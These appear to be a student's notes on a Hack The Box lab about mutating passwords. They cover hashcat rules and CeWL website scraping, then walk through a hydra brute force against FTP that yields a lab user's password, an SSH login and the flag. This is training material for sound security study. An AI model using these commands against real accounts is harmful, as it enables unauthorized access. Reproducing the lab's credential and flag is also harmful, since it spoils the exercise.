
Many people create their passwords according to simplicity instead of security. To eliminate this human weakness that often compromises security measures, password policies can be created on all systems that determine how a password should look. This means that the system recognizes whether the password contains capital letters, special characters, and numbers. In addition, most password policies require a minimum length of eight characters in a password, including at least one of the above specifications.

In the previous sections, we guessed very simple passwords, but it becomes much more difficult to adapt this to systems that apply password policies that force the creation of more complex passwords.

Unfortunately, the tendency for users to create weak passwords also occurs despite the existence of password policies. Most people/employees follow the same rules when creating more complex passwords. Passwords are often created closely related to the service used. This means that many employees often select passwords that can have the company's name in the passwords. A person's preferences and interests also play a significant role. These can be pets, friends, sports, hobbies, and many other elements of life. OSINT information gathering can be very helpful for finding out more about a user's preferences and may assist with password guessing. More information about OSINT can be found in the OSINT: Corporate Recon module. Commonly, users use the following additions for their password to fit the most common password policies:

Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords. Based on statistics provided by WPengine, most password lengths are not longer than ten characters. So what we can do is to pick specific terms that are at least five characters long and seem to be the most familiar to the users, such as the names of their pets, hobbies, preferences, and other interests. If the user chooses a single word (such as the current month), adds the current year, followed by a special character, at the end of their password, we would reach the ten-character password requirement. Considering that most companies require regular password changes, a user can modify their password by just changing the name of a month or a single number, etc. Let's use a simple example to create a password list with only one entry.

lets creat a very simple passsword list -> nano newpass.lsit -> only put in the word 'password' 

since we already have the custom.rules downloaded we cna use hashcat to make a new password list with the one above ->  hashcat --force newpass.list -r custom.rules --stdout | sort -u > mut_password.list

head mut_password.list 
passw0rd
passw0rd!
Passw0rd
Passw0rd!
passw0rd01!
Passw0rd01
Passw0rd01!
passw0rd02!
Passw0rd02
Passw0rd02!

we can see how we turned one password into MANY 


We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

SYNTAX: 

MJBUCKNER@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
MJBUCKNER@htb[/htb]$ wc -l inlane.wordlist

326

CHALLENGE: 10.129.226.169

Question 1 - Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.
1) hashcat pass.list -r custom.rules --stdout | sort -u > mut_password2.list
2)  Due to the Diffie-Hellman Key Exchange, bruteforcing of SSH is considerably slower than other services, therefore, students can instead target FTP: 
3) hydra -l sam -P mut_password2.list ftp://10.129.226.169 -t 64
output: [21][ftp] host: 10.129.226.169   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
4) ssh sam@10.129.226.169 
5) ls -la 
6) cd smb
7) cat flag.txt
8) HTB{P455_Mu7ations} 

